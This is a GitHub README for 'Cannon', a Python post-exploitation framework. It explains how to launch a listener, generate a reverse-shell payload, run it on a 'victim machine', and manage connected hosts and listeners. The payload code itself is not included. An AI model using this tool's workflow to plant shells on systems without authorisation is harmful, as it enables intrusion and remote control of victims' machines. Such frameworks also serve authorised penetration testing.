# Cannon

![image](https://user-images.githubusercontent.com/85458014/124807053-bfda1a00-df33-11eb-9a56-6f3e38db2dab.png)

Cannon is a post-exploitation framework fully developed in python3. Once you have access to the system, this will make your work much easier with all the functionalities that this tool possesses. You will be able to download and upload files, run pre-defined modules, harvest reverse shells, and many more. This version of Cannon mainly focuses on attacking Unix-based machines. Most of the utilities that this framework carries based on Unix-based systems. But some of the functions will still work in Windows systems as well.

# Installation

`git clone https://github.com/kavishkagihan/Cannon/cannon.git && cd cannon && chmod +x cannon`

# Setup

Once you have this installed, you can run it.

`./cannon `

This will start the listener on our loopback address with the default port. If you want to use a different IP and a port you can also specify them.

`./cannon 192.168.1.102 4444`

Then you can use the `help` command to see the help menu.

# Usage

1.Creating the payload file.

After you run cannon, you can create a payload file, which conains the payload to be executed in the victim machine. You have to specify the port which you are listening on. 

`create 9001`

Payload will be saved in a file with the name of the 'SHELL_FILE' variable (defualt is cannon.shell)


2. Executing the payload

Then you can simply execute the shell on the victim machine

`python3 cannon.shell`


3. Cheking the conenctions

Once you have executed the payload, you can check if you have the conenction from the paylaod.

`list`


4. Interate with a connected host

You can interact with a connected host with the 'connect' command.The hosts number should be given as an argument. You can check the number of the host with 'list'

`connect 1`


5. Disconenct a host

You can simply disconnect an unwanted host with the 'disconnect'  command.The hosts number should be given as an argument. You can check the number of the host with 'list'

`disconnect 1`



6. Start another listener

You also can start another listner and get conenctions through that port. The port to start the listner on should be given as an argument.

`bind 9002`


7. Stop a listener

When you want to stop an active listener you can use the 'kill' command. As an argument, the port of the listener should be specified.

`kill 9002`

8. Check the statistics

With the 'status' command you can list the current status such as the Internet status, Listeners IP and PORT, number of listenrs and the number of hosts connected.

`status`



















